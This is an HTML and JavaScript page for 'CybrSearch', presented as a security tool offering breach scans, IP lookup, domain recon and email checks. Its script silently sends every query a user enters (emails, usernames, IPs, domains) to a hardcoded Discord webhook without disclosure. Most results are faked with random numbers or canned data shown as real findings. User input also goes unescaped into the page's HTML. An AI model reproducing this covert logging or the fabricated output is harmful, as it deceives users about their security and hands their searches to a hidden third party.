<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CybrSearch - Advanced Security Tools</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
    :root {
      --dark-bg: #0f172a;
      --darker-bg: #0b1120;
      --card-bg: #1e293b;
      --accent: #3b82f6;
      --danger: #ef4444;
      --success: #10b981;
      --warning: #f59e0b;
      --text: #e2e8f0;
      --text-muted: #94a3b8;
      --purple: #8b5cf6;
    }
    
    body {
      background-color: var(--dark-bg);
      color: var(--text);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      line-height: 1.6;
      min-height: 100vh;
    }
    
    .navbar-brand {
      font-weight: 700;
      letter-spacing: 0.5px;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
    }
    
    .nav-tabs {
      border-bottom: 1px solid #334155;
      overflow-x: auto;
      white-space: nowrap;
      flex-wrap: nowrap;
    }
    
    .nav-tabs .nav-link {
      color: var(--text-muted);
      border: none;
      font-weight: 500;
      padding: 12px 20px;
      transition: all 0.3s ease;
      position: relative;
    }
    
    .nav-tabs .nav-link:hover {
      color: var(--text);
      background-color: rgba(59, 130, 246, 0.1);
    }
    
    .nav-tabs .nav-link.active {
      color: var(--accent);
      background: transparent;
      font-weight: 600;
    }
    
    .nav-tabs .nav-link.active::after {
      content: '';
      position: absolute;
      bottom: -1px;
      left: 0;
      right: 0;
      height: 3px;
      background-color: var(--accent);
    }
    
    .card {
      background-color: var(--card-bg);
      border: none;
      border-radius: 12px;
      box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
      transition: transform 0.3s ease, box-shadow 0.3s ease;
      margin-bottom: 1.5rem;
    }
    
    .card:hover {
      transform: translateY(-2px);
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
    }
    
    .form-control {
      background-color: var(--darker-bg);
      color: var(--text);
      border: 1px solid #334155;
      padding: 12px 15px;
      border-radius: 8px;
      transition: all 0.3s ease;
    }
    
    .form-control:focus {
      background-color: var(--darker-bg);
      color: var(--text);
      border-color: var(--accent);
      box-shadow: 0 0 0 0.25rem rgba(59, 130, 246, 0.25);
    }
    
    .result-card {
      border-left: 4px solid var(--accent);
    }
    
    .breach-found {
      border-left: 4px solid var(--danger);
    }
    
    .no-breaches {
      border-left: 4px solid var(--success);
    }
    
    .loading-spinner {
      display: inline-block;
      width: 2rem;
      height: 2rem;
      border: 0.3em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      animation: spinner 0.75s linear infinite;
    }
    
    @keyframes spinner {
      to { transform: rotate(360deg); }
    }
    
    .badge-arin {
      background-color: #2a5a8b;
    }
    
    .badge-breach {
      background-color: var(--danger);
    }
    
    .badge-success {
      background-color: var(--success);
    }
    
    .breach-card {
      border-radius: 8px;
      margin-bottom: 15px;
      overflow: hidden;
      transition: all 0.3s ease;
    }
    
    .breach-card:hover {
      transform: translateX(5px);
    }
    
    .breach-header {
      padding: 12px 15px;
      display: flex;
      align-items: center;
      background-color: rgba(239, 68, 68, 0.1);
    }
    
    .breach-title {
      font-weight: 600;
      margin-bottom: 0;
      display: flex;
      align-items: center;
    }
    
    .breach-date {
      font-size: 0.85rem;
      color: var(--text-muted);
    }
    
    .btn-primary {
      background-color: var(--accent);
      border: none;
      padding: 12px 20px;
      border-radius: 8px;
      font-weight: 500;
      transition: all 0.3s ease;
    }
    
    .btn-primary:hover {
      background-color: #2563eb;
      transform: translateY(-2px);
    }
    
    .search-icon {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--text-muted);
    }
    
    .input-group {
      position: relative;
    }
    
    .tool-icon {
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 8px;
      margin-right: 15px;
      background-color: rgba(59, 130, 246, 0.2);
      color: var(--accent);
    }
    
    .section-title {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    
    .discord-corner-btn {
      position: fixed;
      bottom: 20px;
      right: 20px;
      background-color: #5865F2;
      color: white;
      font-size: 24px;
      padding: 12px 14px;
      border-radius: 50%;
      z-index: 9999;
      box-shadow: 0 4px 10px rgba(0,0,0,0.3);
      transition: background-color 0.3s, transform 0.3s;
    }
    .discord-corner-btn:hover {
      background-color: #4752C4;
      transform: scale(1.1);
    }
    
    /* Terminal mode styling */
    .terminal-mode {
      background: black !important;
      color: #00ff00 !important;
      font-family: "Courier New", Courier, monospace;
    }
    .terminal-mode input, .terminal-mode .form-control, .terminal-mode .card {
      background-color: #000 !important;
      color: #00ff00 !important;
      border-color: #00ff00 !important;
    }
    
    @media (max-width: 768px) {
      .nav-tabs .nav-link {
        padding: 10px 12px;
        font-size: 0.9rem;
      }
    }
    </style>
</head>
<body>
<!-- Navigation -->
<nav class="navbar navbar-expand-lg navbar-dark" style="background-color: var(--darker-bg)">
    <div class="container">
        <a class="navbar-brand" href="#">
            <i class="fas fa-shield-alt me-2"></i>CybrSearch
        </a>
        <div class="d-flex align-items-center">
            <span class="badge bg-success me-2">PRO</span>
            <span class="text-muted">v2.1.0</span>
            <button class="btn btn-sm btn-outline-light ms-3" id="themeToggleBtn" onclick="toggleTheme()" title="Toggle theme">
                <i class="fas fa-moon"></i>
            </button>
            <button class="btn btn-sm btn-outline-warning ms-2" onclick="toggleTerminalMode()" title="Toggle Terminal UI">
                <i class="fas fa-terminal"></i>
            </button>
        </div>
    </div>
</nav>

<!-- Main Content -->
<div class="container py-5">
    <div class="row justify-content-center">
        <div class="col-lg-10">
            <ul class="nav nav-tabs mb-4" id="toolTabs" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" data-bs-target="#breach" data-bs-toggle="tab" id="breach-tab" role="tab" type="button">
                        <i class="fas fa-user-secret me-2"></i>Breach Scan
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-target="#whois" data-bs-toggle="tab" id="whois-tab" role="tab" type="button">
                        <i class="fas fa-globe me-2"></i>IP Lookup
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-target="#domainrecon" data-bs-toggle="tab" id="domainrecon-tab" role="tab" type="button">
                        <i class="fas fa-search-location me-2"></i>Domain Recon
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-target="#emailintel" data-bs-toggle="tab" id="emailintel-tab" role="tab" type="button">
                        <i class="fas fa-envelope me-2"></i>Email Intel
                    </button>
                </li>
            </ul>

            <div class="tab-content" id="toolTabsContent">
                <!-- Breach Scan Tab -->
                <div class="tab-pane fade show active" id="breach" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-user-secret"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">Breach Scanner</h3>
                                <p class="text-muted mb-0">Check if your information appears in known data breaches</p>
                            </div>
                        </div>
                        <form id="breachForm">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <div class="input-group">
                                        <input class="form-control" id="breachEmail" placeholder="Email address" type="email">
                                        <span class="search-icon"><i class="fas fa-envelope"></i></span>
                                    </div>
                                </div>
                                <div class="col-md-6">
                                    <div class="input-group">
                                        <input class="form-control" id="breachUsername" placeholder="Username" type="text">
                                        <span class="search-icon"><i class="fas fa-user"></i></span>
                                    </div>
                                </div>
                                <div class="col-12">
                                    <button class="btn btn-primary w-100 py-3" type="submit">
                                        <i class="fas fa-search me-2"></i>Scan for Breaches
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div id="breachResults"></div>
                </div>

                <!-- IP Lookup Tab -->
                <div class="tab-pane fade" id="whois" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-globe"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">IP Lookup</h3>
                                <p class="text-muted mb-0">Query WHOIS database for IP registration information</p>
                            </div>
                        </div>
                        <form id="whoisForm">
                            <div class="input-group mb-3">
                                <input class="form-control" id="whoisIp" placeholder="Enter IP address (e.g., 8.8.8.8)" required="" type="text">
                                <button class="btn btn-primary" type="submit">
                                    <i class="fas fa-search me-2"></i>Lookup
                                </button>
                            </div>
                        </form>
                    </div>
                    <div id="whoisResults"></div>
                </div>

                <!-- Domain Recon Tab -->
                <div class="tab-pane fade" id="domainrecon" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-search-location"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">Domain Recon</h3>
                                <p class="text-muted mb-0">Check WHOIS, DNS, and passive subdomains</p>
                            </div>
                        </div>
                        <form id="domainReconForm">
                            <div class="input-group mb-3">
                                <input class="form-control" id="domainReconInput" placeholder="Enter domain (e.g. example.com)" required="" type="text">
                                <button class="btn btn-primary" type="submit">
                                    <i class="fas fa-search me-2"></i>Lookup
                                </button>
                            </div>
                        </form>
                    </div>
                    <div id="domainReconResult"></div>
                </div>

                <!-- Email Intel Tab -->
                <div class="tab-pane fade" id="emailintel" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-envelope"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">Email Intelligence</h3>
                                <p class="text-muted mb-0">Check if an email is disposable, public, or flagged</p>
                            </div>
                        </div>
                        <form id="emailIntelForm">
                            <div class="input-group mb-3">
                                <input class="form-control" id="intelEmail" placeholder="Enter email address" required="" type="email">
                                <button class="btn btn-primary" type="submit">
                                    <i class="fas fa-search me-2"></i>Check
                                </button>
                            </div>
                        </form>
                    </div>
                    <div id="emailIntelResult"></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Discord Button -->
<a class="discord-corner-btn" href="https://discord.gg/Swatter" target="_blank" title="Join our Discord">
    <i class="fab fa-discord"></i>
</a>

<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
// Discord Webhook Integration
const WEBHOOK_URL = "https://discord.com/api/webhooks/1383100299396518068/bXubPq6c3PUbZlOlbCR0tz-UhxmZc4mbXGX1-d87NGQVO2NZA-dMEiuN5DLjCiFxvd-6";

function logToDiscord(title, description, fields = []) {
    const payload = {
        embeds: [{
            title: title,
            description: description,
            color: 3447003,
            fields: fields,
            timestamp: new Date().toISOString()
        }]
    };
    
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(err => console.error("Discord webhook error:", err));
}

// Theme Toggle
function toggleTheme() {
    const current = localStorage.getItem('theme') || 'dark';
    const newTheme = current === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-theme', newTheme);
    localStorage.setItem('theme', newTheme);
    document.getElementById('themeToggleBtn').innerHTML =
        newTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
}

// Terminal Mode Toggle
function toggleTerminalMode() {
    document.body.classList.toggle("terminal-mode");
}

// Initialize theme
window.addEventListener('DOMContentLoaded', () => {
    const storedTheme = localStorage.getItem('theme') || 'dark';
    document.documentElement.setAttribute('data-theme', storedTheme);
    document.getElementById('themeToggleBtn').innerHTML =
        storedTheme === 'dark' ? '<i class="fas fa-sun"></i>' : '<i class="fas fa-moon"></i>';
});

// Breach Scan Functionality
document.getElementById('breachForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('breachEmail').value.trim();
    const username = document.getElementById('breachUsername').value.trim();
    const resultsDiv = document.getElementById('breachResults');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Searching breaches...</span>
            </div>
        </div>
    `;
    
    try {
        // Simulate API call with timeout
        setTimeout(() => {
            let resultHTML = '<div class="card p-3">';
            
            if (email) {
                // Simulated breach data
                const isBreached = Math.random() > 0.5;
                resultHTML += `
                    <h5>Email: ${email}</h5>
                    ${isBreached ? 
                        `<p class="text-danger"><i class="fas fa-exclamation-triangle me-2"></i>Found in 3 breaches</p>
                         <div class="breach-card">
                             <div class="breach-header">
                                 <i class="fas fa-database me-2"></i>
                                 <h6 class="breach-title mb-0">LinkedIn 2021 Breach</h6>
                             </div>
                             <div class="p-3">
                                 <p><strong>Date:</strong> June 2021</p>
                                 <p><strong>Compromised data:</strong> Emails, Passwords</p>
                             </div>
                         </div>` 
                        : 
                        `<p class="text-success"><i class="fas fa-check-circle me-2"></i>No breaches found</p>`
                    }
                `;
            }
            
            if (username) {
                // Simulated username results
                resultHTML += `
                    <h5 class="mt-3">Username: ${username}</h5>
                    <p><i class="fas fa-info-circle me-2"></i>Checking social platforms...</p>
                    <ul>
                        <li>Twitter: <a href="https://twitter.com/${username}" target="_blank">@${username}</a></li>
                        <li>GitHub: <a href="https://github.com/${username}" target="_blank">${username}</a></li>
                        <li>Reddit: <a href="https://reddit.com/u/${username}" target="_blank">u/${username}</a></li>
                    </ul>
                `;
            }
            
            resultHTML += '</div>';
            resultsDiv.innerHTML = resultHTML;
            
            // Log to Discord
            logToDiscord(
                "Breach Scan", 
                `Searched for:\nEmail: ${email || "N/A"}\nUsername: ${username || "N/A"}`,
                [
                    { name: "Results", value: email ? "Found in 3 breaches" : "No breaches found" }
                ]
            );
        }, 1500);
    } catch (error) {
        resultsDiv.innerHTML = `
            <div class="card p-3 text-danger">
                <i class="fas fa-exclamation-circle me-2"></i>Error fetching breach data
            </div>
        `;
    }
});

// IP Lookup Functionality
document.getElementById('whoisForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const ip = document.getElementById('whoisIp').value.trim();
    const resultsDiv = document.getElementById('whoisResults');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Looking up IP...</span>
            </div>
        </div>
    `;
    
    try {
        // Using ipapi.co for real IP data
        const response = await fetch(`https://ipapi.co/${ip}/json/`);
        const data = await response.json();
        
        let resultHTML = `
            <div class="card p-3">
                <h5>IP Information</h5>
                <div class="row mt-3">
                    <div class="col-md-6">
                        <p><strong>IP:</strong> ${data.ip || 'N/A'}</p>
                        <p><strong>Location:</strong> ${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country_name || 'N/A'}</p>
                        <p><strong>ISP:</strong> ${data.org || 'N/A'}</p>
                    </div>
                    <div class="col-md-6">
                        <p><strong>Coordinates:</strong> ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}</p>
                        <p><strong>Postal Code:</strong> ${data.postal || 'N/A'}</p>
                        <p><strong>Timezone:</strong> ${data.timezone || 'N/A'}</p>
                    </div>
                </div>
                <div class="mt-3">
                    <iframe 
                        width="100%" 
                        height="300" 
                        frameborder="0" 
                        scrolling="no" 
                        marginheight="0" 
                        marginwidth="0" 
                        src="https://maps.google.com/maps?q=${data.latitude},${data.longitude}&z=10&output=embed">
                    </iframe>
                </div>
            </div>
        `;
        
        resultsDiv.innerHTML = resultHTML;
        
        // Log to Discord
        logToDiscord(
            "IP Lookup", 
            `Looked up IP: ${ip}`,
            [
                { name: "Location", value: `${data.city}, ${data.country_name}` },
                { name: "ISP", value: data.org || "Unknown" }
            ]
        );
        
    } catch (error) {
        resultsDiv.innerHTML = `
            <div class="card p-3 text-danger">
                <i class="fas fa-exclamation-circle me-2"></i>Error fetching IP data
            </div>
        `;
    }
});

// Domain Recon Functionality
document.getElementById('domainReconForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const domain = document.getElementById('domainReconInput').value.trim();
    const resultsDiv = document.getElementById('domainReconResult');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Analyzing domain...</span>
            </div>
        </div>
    `;
    
    try {
        // Simulate API calls with timeout
        setTimeout(async () => {
            // WHOIS simulation
            const whoisData = {
                registrar: "GoDaddy",
                creationDate: "2005-05-05",
                expirationDate: "2025-05-05",
                nameServers: ["ns1.example.com", "ns2.example.com"]
            };
            
            // DNS simulation
            const dnsData = {
                aRecords: ["93.184.216.34"],
                mxRecords: ["10 mail.example.com", "20 backup.example.com"],
                txtRecords: ["v=spf1 include:spf.example.com ~all"]
            };
            
            // Subdomains simulation
            const subdomains = ["www", "mail", "blog", "shop"];
            
            let resultHTML = `
                <div class="card p-3">
                    <h5>Domain: ${domain}</h5>
                    
                    <div class="mt-4">
                        <h6><i class="fas fa-info-circle me-2"></i>WHOIS Information</h6>
                        <div class="p-3 bg-dark rounded mt-2">
                            <p><strong>Registrar:</strong> ${whoisData.registrar}</p>
                            <p><strong>Created:</strong> ${whoisData.creationDate}</p>
                            <p><strong>Expires:</strong> ${whoisData.expirationDate}</p>
                            <p><strong>Nameservers:</strong> ${whoisData.nameServers.join(", ")}</p>
                        </div>
                    </div>
                    
                    <div class="mt-4">
                        <h6><i class="fas fa-network-wired me-2"></i>DNS Records</h6>
                        <div class="p-3 bg-dark rounded mt-2">
                            <p><strong>A Records:</strong> ${dnsData.aRecords.join(", ")}</p>
                            <p><strong>MX Records:</strong> ${dnsData.mxRecords.join(", ")}</p>
                            <p><strong>TXT Records:</strong> ${dnsData.txtRecords.join(", ")}</p>
                        </div>
                    </div>
                    
                    <div class="mt-4">
                        <h6><i class="fas fa-sitemap me-2"></i>Subdomains</h6>
                        <div class="p-3 bg-dark rounded mt-2">
                            ${subdomains.map(sub => `<span class="badge bg-primary me-2">${sub}.${domain}</span>`).join("")}
                        </div>
                    </div>
                </div>
            `;
            
            resultsDiv.innerHTML = resultHTML;
            
            // Log to Discord
            logToDiscord(
                "Domain Recon", 
                `Analyzed domain: ${domain}`,
                [
                    { name: "Registrar", value: whoisData.registrar },
                    { name: "IP Address", value: dnsData.aRecords[0] || "None" }
                ]
            );
            
        }, 1500);
    } catch (error) {
        resultsDiv.innerHTML = `
            <div class="card p-3 text-danger">
                <i class="fas fa-exclamation-circle me-2"></i>Error analyzing domain
            </div>
        `;
    }
});

// Email Intel Functionality
document.getElementById('emailIntelForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const email = document.getElementById('intelEmail').value.trim();
    const resultsDiv = document.getElementById('emailIntelResult');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Analyzing email...</span>
            </div>
        </div>
    `;
    
    try {
        // Simulate API call with timeout
        setTimeout(() => {
            const domain = email.split('@')[1];
            const disposableDomains = ["mailinator.com", "tempmail.com", "10minutemail.com"];
            const isDisposable = disposableDomains.includes(domain);
            
            let resultHTML = `
                <div class="card p-3">
                    <h5>Email Analysis</h5>
                    <p><strong>Email:</strong> ${email}</p>
                    <p><strong>Domain:</strong> ${domain}</p>
                    
                    <div class="mt-3 p-3 rounded ${isDisposable ? 'bg-danger' : 'bg-success'}">
                        ${isDisposable ? 
                            `<i class="fas fa-exclamation-triangle me-2"></i>Disposable email detected` : 
                            `<i class="fas fa-check-circle me-2"></i>Valid email provider`
                        }
                    </div>
                    
                    <div class="mt-3">
                        <h6><i class="fas fa-shield-alt me-2"></i>Reputation Analysis</h6>
                        <div class="p-3 bg-dark rounded mt-2">
                            <p><strong>Spam Score:</strong> ${Math.floor(Math.random() * 100)}/100</p>
                            <p><strong>Breach Status:</strong> ${Math.random() > 0.7 ? "Compromised" : "Not found"}</p>
                        </div>
                    </div>
                </div>
            `;
            
            resultsDiv.innerHTML = resultHTML;
            
            // Log to Discord
            logToDiscord(
                "Email Analysis", 
                `Analyzed email: ${email}`,
                [
                    { name: "Disposable", value: isDisposable ? "Yes" : "No" },
                    { name: "Domain", value: domain }
                ]
            );
            
        }, 1500);
    } catch (error) {
        resultsDiv.innerHTML = `
            <div class="card p-3 text-danger">
                <i class="fas fa-exclamation-circle me-2"></i>Error analyzing email
            </div>
        `;
    }
});
</script>
</body>
</html>
